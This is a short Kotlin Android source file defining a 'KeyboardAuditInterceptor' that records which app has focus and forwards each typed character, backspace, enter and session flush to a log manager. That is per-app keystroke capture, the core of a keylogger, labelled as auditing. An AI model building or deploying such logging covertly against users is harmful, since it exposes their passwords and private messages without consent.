package com.mobcare.audit

import android.content.Context

class KeyboardAuditInterceptor(private val context: Context) {

    fun onTargetAppFocused(packageName: String) {
        AuditLogManager.onAppFocused(context, packageName)
    }

    fun onCharacterTyped(packageName: String, char: String) {
        AuditLogManager.onCharTyped(context, packageName, char)
    }

    fun onBackspace(packageName: String) {
        AuditLogManager.onBackspace()
    }

    fun onEnterPressed(packageName: String) {
        AuditLogManager.onEnterPressed(context)
    }

    fun onFinishSession() {
        AuditLogManager.flushBuffer(context)
    }
}
